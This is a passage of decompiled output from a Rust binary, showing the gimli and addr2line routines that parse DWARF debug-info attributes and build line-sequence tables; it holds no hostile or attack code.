auStack1840;\n            auStack1456._0_4_ = uStack1816;\n            auStack1456._4_4_ = uStack1816 >> 0x20;\n            _auStack1840 = CONCAT48(CONCAT22(uStack1822, iStack1824), uStack1832);\n            _auStack1840 = CONCAT412(uStack1820, _auStack1840);\n            iStack1824 = uStack1816;\n            uStack1822 = uStack1816 >> 0x10;\n            uStack1820 = auStack1456._4_4_;\n            if (iStack1824 < 0x72) {\n    // switch table (25 cases) at 0x429c74\n                switch(iStack1824) {\n                case 3:\n                    dbg.value<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>\n                              (&uStack1992, &ppppppppuStack1848);\n                    uStack648 = auStack1984._0_4_;\n                    uStack644 = auStack1984._4_4_;\n                    uStack640 = uStack1976;\n                    uStack636 = uStack1976._4_4_;\n                    ppppppppuVar67 = uStack1992;\n                    break;\n                case 0x10:\n                    dbg.value<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>\n                              (&uStack1992, &ppppppppuStack1848);\n                    if (uStack1992 == 0x10) {\n                        ppppppppuStack2064 = auStack1984;\n                    }\n                    if (uStack1992 == 0x10) {\n                        iVar37 = 1;\n                    }\n                    break;\n                case 0x11:\n                    dbg.value<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>\n                              (&uStack1992, &ppppppppuStack1848);\n                    ppppppppuStack2096 = uStack1992;\n                    ppppppppuVar64 = auStack1984;\n                    break;\n                case 0x1b:\n                    dbg.value<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>\n                              (&uStack1992, &ppppppppuStack1848);\n                    uStack632 = auStack1984._0_4_;\n                    uStack628 = auStack1984._4_4_;\n                    uStack624 = uStack1976;\n                    uStack620 = uStack1976._4_4_;\n                    unaff_RDI = uStack1992;\n                }\n            }\n            else if (iStack1824 < 0x2131) {\n    // switch table (27 cases) at 0x429cd8\n                switch(iStack1824) {\n                case 0x72:\n                    dbg.value<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>\n                              (&uStack1992, &ppppppppuStack1848);\n                    if (uStack1992 == 0x1c) {\n                        iStack1248 = auStack1984;\n                    }\n                    break;\n                case 0x73:\ncode_r0x004267dc:\n                    dbg.value<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>\n                              (&uStack1992, &ppppppppuStack1848);\n                    if (uStack1992 == 0xb) {\n                        pppppppuStack1240 = auStack1984;\n                    }\n                    break;\n                case 0x74:\ncode_r0x00426814:\n                    dbg.value<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>\n                              (&uStack1992, &ppppppppuStack1848);\n                    if (uStack1992 == 0x17) {\n                        iStack1224 = auStack1984;\n                    }\n                    break;\n                case 0x8c:\n                    dbg.value<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>\n                              (&uStack1992, &ppppppppuStack1848);\n                    if (uStack1992 == 0x12) {\n                        iStack1232 = auStack1984;\n                    }\n                }\n            }\n            else if ((auStack1456._0_4_ & 0xffff) == 0x2131) {\n                if (uStack968 != 1) {\n                    dbg.value<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>\n                              (&uStack1992, &ppppppppuStack1848);\n                    if (uStack1992 == 0x2d) {\n                        uStack968 = 1;\n                        ppppppppuStack960 = auStack1984;\n                    }\n                }\n            }\n            else {\n                if ((auStack1456._0_4_ & 0xffff) == 0x2132) goto code_r0x00426814;\n                if (iStack1824 == 0x2133) goto code_r0x004267dc;\n            }\n            if (uStack1712 == NULL) {\n                ppppppppuVar53 = ppppppppuStack1704 + 3;\n                goto code_r0x004269c2;\n            }\n            ppppppppuVar41 = ppppppppuStack1704 + 6;\n        }\n        goto code_r0x00426f23;\n    }\n    ppppppppuStack2096 = 0x2e;\n    iVar37 = 0;\n    unaff_RDI = 0x2e;\n    ppppppppuVar67 = 0x2e;\n    ppppppppuVar53 = &ppppppppuStack1632;\ncode_r0x004269c2:\n    if (*ppppppppuVar53 != 0x1) {\n        pppppppuVar70 = ppppppppuStack1704[1];\n        *ppppppppuVar53 = 0x1;\n        ppppppppuStack1704[4] = uStack1736 - pppppppuVar70;\n    }\ncode_r0x004269df:\n    uStack1832 = ppppppppuVar53;\n    if (ppppppppuVar67 == 0x2e) {\n        auStack1840 = NULL;\n    }\n    else {\n        _auStack1688 = CONCAT48(uStack648, ppppppppuVar67);\n        _auStack1688 = CONCAT412(uStack644, _auStack1688);\n        auStack1672 = CONCAT44(uStack636, uStack640);\n        dbg.attr_string<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>\n                  (&ppppppppuStack1848, ppppppppuStack1920, &uStack1416, auStack1688);\n        if (ppppppppuStack1848 == NULL) {\n        }\n        else {\n            auStack1840 = NULL;\n        }\n    }\n    ppppppppuStack1288 = auStack1840;\n    ppppppppuStack1280 = uStack1832;\n    if (unaff_RDI == 0x2e) {\n        ppppppuVar22 = NULL;\n    }\n    else {\n        _auStack1688 = CONCAT48(uStack632, unaff_RDI);\n        _auStack1688 = CONCAT412(uStack628, _auStack1688);\n        auStack1672 = CONCAT44(uStack620, uStack624);\n        dbg.attr_string<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>\n                  (&ppppppppuStack1848, ppppppppuStack1920, &uStack1416, auStack1688);\n        if (ppppppppuStack1848 == NULL) {\n        }\n        else {\n            auStack1840 = NULL;\n        }\n        ppppppppuStack2048 = uStack1832;\n        ppppppuVar22 = auStack1840;\n    }\n    ppppppppuStack1264 = ppppppppuStack2048;\n    ppppppuStack1272 = ppppppuVar22;\n    if (iVar37 == 0) {\n        uVar35 = 0x2f;\n        ppppppppuVar41 = unaff_RDI;\n        ppppppppuStack1944 = ppppppppuStack2048;\n        ppppppppuStack2032 = ppppppppuStack2048;\njoined_r0x00426b91:\n        if (uStack1048 != 0x2f) {\n            if ((CONCAT44(uStack1164, uStack1168) != 0) &&\n               ((CONCAT44(uStack1164, uStack1168) & 0x3fffffffffffffff) != 0)) {\n                sym.__rust_dealloc(CONCAT44(uStack1172, uStack1176), 2);\n            }\n            if ((CONCAT44(uStack1140, uStack1144) != 0) && (CONCAT44(uStack1140, uStack1144) * 0x18 != 0)) {\n                sym.__rust_dealloc(CONCAT44(uStack1148, uStack1152), 8);\n            }\n            if ((CONCAT44(uStack1116, uStack1120) != 0) &&\n               ((CONCAT44(uStack1116, uStack1120) & 0x3fffffffffffffff) != 0)) {\n                sym.__rust_dealloc(CONCAT44(uStack1124, uStack1128), 2);\n            }\n            if ((CONCAT44(uStack1092, uStack1096) != 0) && ((CONCAT44(uStack1092, uStack1096) & 0x3ffffffffffffff) != 0)\n               ) {\n                sym.__rust_dealloc(CONCAT44(uStack1100, uStack1104), 8);\n            }\n        }\n        ppppppppuStack1216 = ppppppppuStack2064;\n        ppppppppuStack1208 = ppppppppuStack2056;\n        pppppppuStack1200 = pppppppuStack1872;\n        uStack1160 = uStack664;\n        uStack1176 = uStack680;\n        uStack1172 = uStack676;\n        uStack1168 = uStack672;\n        uStack1164 = uStack668;\n        uStack1136 = uStack696;\n        uStack1152 = uStack712;\n        uStack1148 = uStack708;\n        uStack1144 = uStack704;\n        uStack1140 = uStack700;\n        uStack1112 = uStack728;\n        uStack1128 = uStack744;\n        uStack1124 = uStack740;\n        uStack1120 = uStack736;\n        uStack1116 = uStack732;\n        uStack1088 = uStack760;\n        uStack1104 = uStack776;\n        uStack1100 = uStack772;\n        uStack1096 = uStack768;\n        uStack1092 = uStack764;\n        pppppppuStack1080 = pppppppuStack1752;\n        ppppppppuStack1056 = ppppppppuStack2048;\n        ppppppppuStack1040 = ppppppppuStack1928;\n        ppppppppuStack1032 = ppppppppuStack1696;\n        ppppppppuStack992 = ppppppppuStack1704;\n        uStack1008 = uStack1720;\n        uStack1004 = uStack1720._4_4_;\n        uStack1000 = uStack1712;\n        uStack996 = uStack1712._4_4_;\n        ppppppppuStack1024 = uStack1736;\n        uStack1016 = auStack1728;\n        uStack984 = ppppppppuStack1920;\n        uStack982 = SUB82(ppppppppuStack1944, 0);\n        cStack980 = cStack1993;\n        uStack978 = uStack1996;\n        uStack977 = uStack1994;\n        cStack976 = cStack1995;\n        uStack975 = SUB81(ppppppppuStack2032, 0);\n        uStack970 = uStack1540;\n        uStack974 = uStack1544;\n        ppppppppuVar67 = ppppppppuStack1256;\n        puStack1192 = puVar21;\n        ppppppppuStack1184 = ppppppppuVar41;\n        iStack1072 = iVar37;\n        ppppppuStack1064 = ppppppuVar22;\n        uStack1048 = uVar35;\n        uStack983 = uStack2097;\n        cStack979 = cStack2081;\n        if (((ppppppppuStack2096 != 0x2e) && (ppppppppuVar67 = ppppppppuVar64,  ppppppppuStack2096 != NULL)) &&\n           (ppppppppuVar67 = ppppppppuStack1256,  ppppppppuStack2096 == 0xc)) {\n            uVar45 = ppppppppuStack2008[5] - pppppppuStack1240;\n            unaff_RDI = ppppppppuVar41;\n            pppppppuVar70 = pppppppuStack2072;\n            if (pppppppuStack1240 <= ppppppppuStack2008[5]) {\n                uVar69 = ppppppppuVar64 * (uStack1344 & 0xff);\n                uVar43 = uVar45 - uVar69;\n                if (uVar69 <= uVar45) {\n                    iVar37 = pppppppuStack1240 + ppppppppuStack2008[4];\n    // switch table (8 cases) at 0x429da0\n                    switch(uStack1344) {\n                    case '\\x01':\n                        if (uVar45 != uVar69) {\n                            uVar45 = *(iVar37 + uVar69);\n                            uVar43 = 0;\n                            uVar24 = 0;\ncode_r0x004272a2:\n                            ppppppppuVar67 = uVar45 & 0xff | uVar43 | uVar24 & 0xff00;\n                            goto code_r0x004272ba;\n                        }\n                        break;\n                    case '\\x02':\n                        if (1 < uVar43) {\n                            uVar45 = *(iVar37 + uVar69);\n                            uVar24 = *(iVar37 + uVar69) & 0xff00;\n                            uVar43 = 0;\n                            goto code_r0x004272a2;\n                        }\n                        break;\n                    case '\\x04':\n                        if (3 < uVar43) {\n                            uVar57 = *(iVar37 + uVar69);\n                            uVar45 = uVar57;\n                            uVar24 = uVar57 & 0xffffff00;\n                            uVar43 = uVar57 & 0xffff0000;\n                            goto code_r0x004272a2;\n                        }\n                        break;\n                    case '\\b':\n                        if (7 < uVar43) {\n                            uVar45 = *(iVar37 + uVar69);\n                            uVar24 = uVar45 & 0xffffff00;\n                            uVar43 = uVar45 & 0xffffffffffff0000;\n                            goto code_r0x004272a2;\n                        }\n                    }\n                }\n            }\n            goto code_r0x00426f23;\n        }\ncode_r0x004272ba:\n        ppppppppuStack1256 = ppppppppuVar67;\n        uVar80 = CONCAT22(uStack1406, CONCAT11(uStack1407, uStack1408));\n        uVar24 = uStack1416;\n        uVar57 = uStack1416._4_4_;\n        uVar29 = uStack1404;\n        sym.memcpy(uStack1736, appppppppuStack600, &uStack1400);\n        ppppppppuStack616 = CONCAT44(uVar57, uVar24);\n        ppppppppuStack608 = SUB168(CONCAT412(uVar29, CONCAT48(uVar80, ppppppppuStack616)) >> 0x40, 0);\n        _auStack1672 = CONCAT88(aiStack536, &ppppppppuStack616);\n        ppppppppuStack1656 = NULL;\n        iVar23 = 0;\n        uVar45 = 0;\n        ppppppppuVar41 = ppppppppuStack560;\n        iVar37 = iStack552;\n        ppppppppuVar67 = ppppppppuStack560;\n        do {\n            iVar37 = iVar37 + -1;\n            if (iVar37 == -1) {\n                uVar35 = 0x13;\n                goto code_r0x00429827;\n            }\n            _auStack1688 = CONCAT88(iVar37, ppppppppuVar67 + 1);\n            uVar55 = *ppppppppuVar67;\n            if ((iVar23 == 0x3f) && (1 < uVar55)) {\n                uVar35 = 6;\n                goto code_r0x00429827;\n            }\n            unaff_RDI = uVar55;\n            uVar45 = uVar45 | (uVar55 & 0x7f) << (iVar23 & 0x3f);\n            iVar23 = iVar23 + 7;\n            ppppppppuVar41 = ppppppppuVar41 + 1;\n            ppppppppuVar67 = ppppppppuVar67 + 1;\n        } while (uVar55 < '\\0');\n        if (uVar45 == 0) {\n            dbg.drop_in_place<gimli::read::dwarf::Unit<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>, usize>>\n                      (&ppppppppuStack616);\n            ppppppppuVar67 = ppppppppuStack1936;\n            ppppppppuVar40 = ppppppppuStack1792;\n            ppppppppuVar41 = ppppppppuStack1784;\n            goto joined_r0x00428966;\n        }\n        if (uStack520 <= uVar45 - 1) {\n            uVar35 = 0x12;\n            iVar37 = iStack504;\n            iVar30 = iStack512;\n            if (iStack504 == 0) goto code_r0x00429827;\n            do {\n                uVar43 = *(iVar37 + 0x532);\n                uVar69 = 0xffffffffffffffff;\n                unaff_RDI = 0x10;\n                do {\n                    ppppppppuVar41 = unaff_RDI + uVar43 * 0xe;\n                    if (ppppppppuVar41 == 0x10) goto code_r0x0042822d;\n                    puVar4 = iVar37 + 0x10 + uVar69 * 8;\n                    bVar71 = *puVar4 != uVar45;\n                    ppppppppuVar41 = bVar71;\n                    if (uVar45 <= *puVar4 && bVar71) {\n                        ppppppppuVar41 = 0xff;\n                    }\n                    uVar69 = uVar69 + 1;\n                    unaff_RDI = unaff_RDI + -0xe;\n                } while (ppppppppuVar41 == '\\x01');\n                uVar43 = uVar69;\n                if (ppppppppuVar41 != -1) {\n                    iVar37 = iVar37 - unaff_RDI;\n                    goto code_r0x00428244;\n                }\ncode_r0x0042822d:\n                if (iVar30 == 0) goto code_r0x00429827;\n                iVar37 = *(iVar37 + 0x538 + uVar43 * 8);\n                iVar30 = iVar30 + -1;\n            } while( true );\n        }\n        iVar37 = (uVar45 - 1) * 0x70 + aiStack536[0];\ncode_r0x00428244:\n        ppppppppuStack1656 = *(iVar37 + 0x6a) == '\\x01';\n        puVar21 = sym._gimli::read::abbrev::Attributes_as_core::ops::deref::Deref_::deref::h3a59bec7b942654d(iVar37 + 8)\n        ;\n        ppppppppuVar67 = ppppppppuStack1776;\n        if (ppppppppuVar41 == NULL) {\n            uVar63 = 0;\n            ppppppppuStack2048 = NULL;\n            bVar18 = false;\n            bVar71 = false;\ncode_r0x004286ad:\n            if (ppppppppuStack1504 == NULL) {\ncode_r0x00428702:\n                if ((bVar71) && (bVar18)) {\n                    if (pppppppuStack1528 < pppppppuStack824) {\n                        if (ppppppppuStack1896 == auStack1904) {\n                            dbg.reserve_for_push<addr2line::LineSequence, alloc::alloc::Global>\n                                      (&uStack1912, ppppppppuStack1896);\n                        }\n                        uStack1912[ppppppppuStack1896 * 4] = ppppppppuStack1856;\n                        uStack1912[ppppppppuStack1896 * 4 + 1] = NULL;\n                        uStack1912[ppppppppuStack1896 * 4 + 2] = pppppppuStack1528;\n                        uStack1912[ppppppppuStack1896 * 4 + 3] = pppppppuStack824;\ncode_r0x00428828:\n                        _auStack1904 = CONCAT88(ppppppppuStack1896 + 1, auStack1904);\n                    }\n                }\n                else if ((bVar71) &&\n                        ((ppppppppuStack2048 == 0x1 &&\n                         (pppppppuVar70 = iStack784 + pppppppuStack1528,  pppppppuStack1528 < pppppppuVar70)))) {\n                    if (ppppppppuStack1896 == auStack1904) {\n                        dbg.reserve_for_push<addr2line::LineSequence, alloc::alloc::Global>\n                                  (&uStack1912, ppppppppuStack1896);\n                    }\n                    uStack1912[ppppppppuStack1896 * 4] = ppppppppuStack1856;\n                    uStack1912[ppppppppuStack1896 * 4 + 1] = NULL;\n                    uStack1912[ppppppppuStack1896 * 4 + 2] = pppppppuStack1528;\n                    uStack1912[ppppppppuStack1896 * 4 + 3] = pppppppuVar70;\n                    goto code_r0x00428828;\n                }\ncode_r0x00428887:\n                sym.memcpy(&uStack1408, &ppppppppuStack616, 0x1d0);\n                uStack1416._0_4_ = ppppppppuStack1960;\n                uStack1416._4_4_ = ppppppppuStack1960 >> 0x20;\n                uStack862 = uStack1738;\n                uStack944 = 2;\n                uStack904 = 2;\n                uStack864 = uVar63;\n                if (auStack1480._8_8_ == auStack1480._0_8_) {\n                    dbg.reserve_for_push<addr2line::ResUnit<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>, alloc::alloc::Global>\n                              (&iStack1488, auStack1480._8_8_);\n                }\n                sym.memcpy(auStack1480._8_8_ * 0x230 + iStack1488, &uStack1416);\n                auStack1480 = CONCAT88(auStack1480._8_8_ + 1, auStack1480._0_8_);\n                ppppppppuVar67 = ppppppppuStack1936;\n                ppppppppuVar40 = ppppppppuStack1792;\n                ppppppppuVar41 = ppppppppuStack1784;\n                goto joined_r0x00428966;\n            }\n            ppppppppuVar53 = NULL;\n            ppppppppuVar41 = ppppppppuStack1504;\n            ppppppppuVar67 = ppppppppuStack1504;\n            while( true ) {\n                unaff_RDI = (ppppppppuVar41 >> 1) + ppppppppuVar53;\n                if (ppppppppuStack1960 <= ppppppppuStack1520[unaff_RDI * 2]) break;\n                ppppppppuVar53 = unaff_RDI + 1;\n                unaff_RDI = ppppppppuVar67;\ncode_r0x004286d3:\n                ppppppppuVar41 = unaff_RDI - ppppppppuVar53;\n                ppppppppuVar67 = unaff_RDI;\n                if (unaff_RDI < ppppppppuVar53 || ppppppppuVar41 == NULL) goto code_r0x00428702;\n            }\n            if (ppppppppuStack1520[unaff_RDI * 2] != ppppppppuStack1960) goto code_r0x004286d3;\n            ppppppppuVar67 = -(ppppppppuVar41 >> 1);\n            ppppppppuVar41 = ppppppppuStack1520 + unaff_RDI * 2;\n            do {\n                ppppppppuVar41 = ppppppppuVar41 + -2;\n                if (ppppppppuVar53 == ppppppppuVar67) {\n                    unaff_RDI = NULL;\n                    goto code_r0x0042887e;\n                }\n                if (ppppppppuStack1504 <= unaff_RDI + -1) {\n                    dbg.panic_bounds_check(~ppppppppuVar67 + ppppppppuVar53, ppppppppuStack1504, 0x449c08);\n                    goto code_r0x00429a87;\n                }\n                ppppppppuVar67 = ppppppppuVar67 + 1;\n            } while (*ppppppppuVar41 == ppppppppuStack1960);\n            unaff_RDI = ppppppppuVar53 + (1 - ppppppppuVar67);\n            if (ppppppppuStack1504 < unaff_RDI) {\n                dbg.slice_start_index_len_fail(ppppppppuVar53 + (1 - ppppppppuVar67), ppppppppuStack1504);\n                goto code_r0x00429a87;\n            }\ncode_r0x0042887e:\n            if (unaff_RDI == ppppppppuStack1504) goto code_r0x00428887;\n            ppppppppuVar41 = ppppppppuStack1520 + ppppppppuStack1504 * 2;\n            unaff_RDI = ppppppppuStack1520 + unaff_RDI * 2;\n            ppppppppuStack2008 = ppppppppuStack1776;\n            while( true ) {\n                if (*unaff_RDI != ppppppppuStack1960) goto code_r0x00428887;\n                pppppppuVar70 = unaff_RDI[1];\n                pppppppuVar44 = ppppppppuStack2008[6];\n                if (ppppppppuStack2008[7] < pppppppuVar70) break;\n                uStack1736 = pppppppuVar44 + pppppppuVar70;\n                _auStack1728 = CONCAT88(uStack1720, ppppppppuStack2008[7] - pppppppuVar70);\n                dbg.parse<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>, usize>\n                          (&uStack1416, &uStack1736, pppppppuVar70);\n                if (CONCAT44(uStack1416._4_4_, uStack1416) != 0) goto code_r0x0042997e;\n                if (uStack1376 != NULL) {\n                    ppppppppuStack2064 = uStack1368 & 0xffffffff;\n                    ppppppppuStack2048 = uStack1368 * '\\x02' + uStack1368._4_1_;\n                    ppppppppuVar67 = uStack1376;\n                    ppppppppuVar53 = uStack1384;\ncode_r0x00428a35:\n                    if (ppppppppuVar67 < ppppppppuStack2048) goto code_r0x00428c8b;\n                    uVar45 = 0;\n    // switch table (9 cases) at 0x429dc0\n                    switch(uStack1368._4_1_) {\n                    case 0:\n                        goto code_r0x00428afb;\n                    case 1:\n                        if (ppppppppuVar67 == NULL) break;\n                        ppppppppuVar67 = ppppppppuVar67 + -1;\n                        pppppppuVar70 = *ppppppppuVar53;\n                        ppppppppuVar53 = ppppppppuVar53 + 1;\n                        uVar45 = 0;\n                        uVar24 = 0;\ncode_r0x00428aec:\n                        uVar45 = pppppppuVar70 & 0xff | uVar45 | uVar24 & 0xff00;\ncode_r0x00428afb:\n    // switch table (8 cases) at 0x429de4\n                        switch(ppppppppuStack2064 - 1 & 0xff) {\n                        case 0:\n                            if (ppppppppuVar67 == NULL) {\ncode_r0x00429949:\n                                uVar45 = 0x13;\n                            }\n                            else {\n                                if (ppppppppuVar67 != 0x1) {\n                                    pppppppuVar70 = *ppppppppuVar53;\n                                    ppppppppuVar67 = ppppppppuVar67 + -2;\n                                    pppppppuVar44 = *(ppppppppuVar53 + 1);\n                                    ppppppppuVar53 = ppppppppuVar53 + 2;\n                                    uVar24 = 0;\n                                    goto code_r0x00428b79;\n                                }\n                                ppppppppuVar53 = ppppppppuVar53 + 1;\ncode_r0x004299e3:\n                                uVar45 = 0x13;\n                            }\n                            goto code_r0x004299e8;\n                        case 1:\n                            if (ppppppppuVar67 < 0x2) goto code_r0x00429949;\n                            if ((ppppppppuVar67 & 0xfffffffffffffffe) == 2) {\n                                ppppppppuVar53 = ppppppppuVar53 + 2;\n                                goto code_r0x004299e3;\n                            }\n                            pppppppuVar70 = *ppppppppuVar53;\n                            ppppppppuVar67 = ppppppppuVar67 + -4;\n                            puVar1 = ppppppppuVar53 + 2;\n                            pppppppuVar44 = *puVar1;\n                            ppppppppuVar53 = ppppppppuVar53 + 4;\n                            uVar24 = *puVar1 & 0xff00;\ncode_r0x00428b79:\n                            uVar43 = 0;\n                            break;\n                        default:\n                            uVar45 = ((ppppppppuStack2064 & 0xff) << 8) + 0x17;\n                            goto code_r0x004299e8;\n                        case 3:\n                            if (ppppppppuVar67 < 0x4) goto code_r0x00429949;\n                            if ((ppppppppuVar67 & 0xfffffffffffffffc) == 4) {\n                                ppppppppuVar53 = ppppppppuVar53 + 4;\n                                goto code_r0x004299e3;\n                            }\n                            pppppppuVar70 = *ppppppppuVar53;\n                            uVar57 = *(ppppppppuVar53 + 4);\n                            pppppppuVar44 = uVar57;\n                            ppppppppuVar53 = ppppppppuVar53 + 1;\n                            ppppppppuVar67 = ppppppppuVar67 + -1;\n                            uVar24 = uVar57 & 0xffffff00;\n                            uVar43 = uVar57 & 0xffff0000;\n                            break;\n                        case 7:\n                            if (ppppppppuVar67 < 0x8) goto code_r0x00429949;\n                            if ((ppppppppuVar67 & 0xfffffffffffffff8) == 8) {\n                                ppppppppuVar53 = ppppppppuVar53 + 1;\n                                goto code_r0x004299e3;\n                            }\n                            pppppppuVar70 = *ppppppppuVar53;\n                            pppppppuVar44 = ppppppppuVar53[1];\n                            ppppppppuVar53 = ppppppppuVar53 + 2;\n                            ppppppppuVar67 = ppppppppuVar67 + -2;\n                            uVar24 = pppppppuVar44 & 0xffffff00;\n                            uVar43 = pppppppuVar44 & 0xffffffffffff0000;\n                        }\n                        uVar43 = pppppppuVar44 & 0xff | uVar24 & 0xff00 | uVar43;\n                        if (((uVar45 != 0) || (pppppppuVar70 != NULL)) || (uVar43 != 0)) goto code_r0x00428c19;\n                        goto code_r0x00428a35;\n                    case 2:\n                        if (0x1 < ppppppppuVar67) {\n                            ppppppppuVar67 = ppppppppuVar67 + -2;\n                            uVar27 = *ppppppppuVar53;\n                            pppppppuVar70 = uVar27;\n                            ppppppppuVar53 = ppppppppuVar53 + 2;\n                            uVar24 = uVar27 & 0xff00;\n                            uVar45 = 0;\n                            goto code_r0x00428aec;\n                        }\n                        break;\n                    default:\n                        uVar45 = uStack1368._4_1_ << 8 | 0x17;\n                        goto code_r0x004299e8;\n                    case 4:\n                        if (0x3 < ppppppppuVar67) {\n                            ppppppppuVar67 = ppppppppuVar67 + -4;\n                            uVar57 = *ppppppppuVar53;\n                            pppppppuVar70 = uVar57;\n                            ppppppppuVar53 = ppppppppuVar53 + 4;\n                            uVar24 = uVar57 & 0xffffff00;\n                            uVar45 = uVar57 & 0xffff0000;\n                            goto code_r0x00428aec;\n                        }\n                        break;\n                    case 8:\n                        if (0x7 < ppppppppuVar67) {\n                            ppppppppuVar67 = ppppppppuVar67 + -1;\n                            pppppppuVar70 = *ppppppppuVar53;\n                            ppppppppuVar53 = ppppppppuVar53 + 1;\n                            uVar24 = pppppppuVar70 & 0xffffff00;\n                            uVar45 = pppppppuVar70 & 0xffffffffffff0000;\n                            goto code_r0x00428aec;\n                        }\n                    }\n                    uVar45 = 0x13;\ncode_r0x004299e8:\n                    puStack1864[1] = uVar45;\n                    puStack1864[2] = ppppppppuVar53;\n                    goto code_r0x00429837;\n                }\ncode_r0x00428c8b:\n                unaff_RDI = unaff_RDI + 2;\n                if (unaff_RDI == ppppppppuVar41) goto code_r0x00428887;\n            }\n            uStack1408 = 0x13;\n            uStack1400 = pppppppuVar44;\n            uStack1396 = pppppppuVar44 >> 0x20;\ncode_r0x0042997e:\n            uVar72 = CONCAT22(uStack1406, CONCAT11(uStack1407, uStack1408));\n            ppppppppuStack1848 = CONCAT44(uStack1404, uVar72);\n            auStack1840 = CONCAT44(uStack1396, uStack1400);\n            *(puStack1864 + 1) = uVar72;\n            *(puStack1864 + 0xc) = uStack1404;\n            *(puStack1864 + 2) = uStack1400;\n            *(puStack1864 + 0x14) = uStack1396;\n            goto code_r0x00429837;\n        }\n        puVar68 = puVar21 + ppppppppuVar41 * 2;\n        uVar63 = 0;\n        bVar15 = false;\n        ppppppppuStack2048 = NULL;\n        bVar18 = false;\n        bVar71 = false;\n        while( true ) {\n            sym.gimli::read::unit::parse_attribute::h7cbf9c79cddacd7d\n                      (&uStack1416, auStack1688, *(auStack1672 + 0x48), *puVar21);\n            if (CONCAT44(uStack1416._4_4_, uStack1416) != 0) goto code_r0x0042997e;\n            _auStack1728 = CONCAT48(uStack1392, auStack1728);\n            _auStack1728 = CONCAT412(uStack1392._4_4_, _auStack1728);\n            iVar56 = uStack1384;\n            uStack1712 = uStack1384;\n            uStack1736 = CONCAT44(uStack1404, CONCAT22(uStack1406, CONCAT11(uStack1407, uStack1408)));\n            auStack1728 = CONCAT44(uStack1396, uStack1400);\n            if (0x12 < iVar56) break;\n            if (iVar56 == 0x11) {\n                dbg.value<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>\n                          (&uStack1416, &uStack1736);\n                if (CONCAT44(uStack1416._4_4_, uStack1416) == 0) {\n                    bVar71 = true;\n                    pppppppuStack1528 = CONCAT44(uStack1404, CONCAT22(uStack1406, CONCAT11(uStack1407, uStack1408)));\n                }\n            }\n            else if (iVar56 == 0x12) {\n                dbg.value<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>\n                          (&uStack1416, &uStack1736);\n                if (CONCAT44(uStack1416._4_4_, uStack1416) == 0) {\n                    bVar18 = true;\n                    pppppppuStack824 = CONCAT44(uStack1404, CONCAT22(uStack1406, CONCAT11(uStack1407, uStack1408)));\n                }\n                else if (uStack1416 == 7) {\n                    ppppppppuStack2048 = 0x1;\n                    iStack784 = CONCAT44(uStack1404, CONCAT22(uStack1406, CONCAT11(uStack1407, uStack1408)));\n                }\n            }\ncode_r0x004282a1:\n            puVar21 = puVar21 + 2;\n            if (puVar21 == puVar68) {\n                if (!bVar15) goto code_r0x004286ad;\n                uVar27 = uStack544 >> 0x10;\n                ppppppppuVar41 = ppppppppuVar67 + 0x1b;\n                if (4 >= uVar27) {\n                    ppppppppuVar41 = ppppppppuVar67 + 0x19;\n                }\n                uStack1832 = ppppppppuVar67[(4 < uVar27) * 2 + 0x18];\n                iVar37 = *ppppppppuVar41 - pppppppuStack1576;\n                if (*ppppppppuVar41 < pppppppuStack1576) {\n                    auStack1840 = 0x13;\n                }\n                else {\n                    uStack1384 = ppppppppuVar67[4];\n                    uStack1376 = ppppppppuVar67[5];\n                    uStack1416._0_4_ = uStack1832 + pppppppuStack1576;\n                    uStack1416._4_4_ = uStack1832 + pppppppuStack1576 >> 0x20;\n                    uStack1408 = iVar37;\n                    uStack1407 = iVar37 >> 8;\n                    uStack1406 = iVar37 >> 0x10;\n                    uStack1404 = iVar37 >> 0x20;\n                    uStack1400 = uStack544;\n                    uStack1396 = uStack1396 & 0xffffff00 | 4 < uVar27;\n                    uStack1392 = ppppppppuStack456;\n                    uStack1368 = ppppppppuStack440;\n                    unaff_RDI = ppppppppuStack456;\n                    while( true ) {\n                        dbg.next<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>\n                                  (&ppppppppuStack1848, &uStack1416);\n                        if (ppppppppuStack1848 != NULL) break;\n                        if (auStack1840 != 0x1) goto code_r0x00428887;\n                        unaff_RDI = CONCAT44(uStack1820, CONCAT22(uStack1822, iStack1824));\n                        if (uStack1832 < unaff_RDI) {\n                            if (ppppppppuStack1896 == auStack1904) {\n                                dbg.reserve_for_push<addr2line::LineSequence, alloc::alloc::Global>\n                                          (&uStack1912, ppppppppuStack1896);\n                            }\n                            uStack1912[ppppppppuStack1896 * 4] = ppppppppuStack1856;\n                            uStack1912[ppppppppuStack1896 * 4 + 1] = NULL;\n                            uStack1912[ppppppppuStack1896 * 4 + 2] = uStack1832;\n                            uStack1912[ppppppppuStack1896 * 4 + 3] = unaff_RDI;\n                            _auStack1904 = CONCAT88(ppppppppuStack1896 + 1, auStack1904);\n                        }\n                    }\n                }\n                puStack1864[1] = auStack1840;\n                puStack1864[2] = uStack1832;\n                *puStack1864 = 1;\n                goto code_r0x0042983e;\n            }\n        }\n        if (iVar56 == 0x13) {\n            dbg.value<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>(&uStack1416, &uStack1736);\n            if (CONCAT44(uStack1416._4_4_, uStack1416) == 0x26) {\n                uStack1738 = CONCAT11(uStack1407, uStack1408);\n            }\n            if (uStack1416 == 0x26) {\n                uVar63 = 1;\n            }\n            goto code_r0x004282a1;\n        }\n        if (iVar56 != 0x55) goto code_r0x004282a1;\n        dbg.value<gimli::read::endian_slice::EndianSlice<gimli::endianity::LittleEndian>>(&uStack1416, &uStack1736);\n        iVar37 = CONCAT44(uStack1404, CONCAT22(uStack1406, 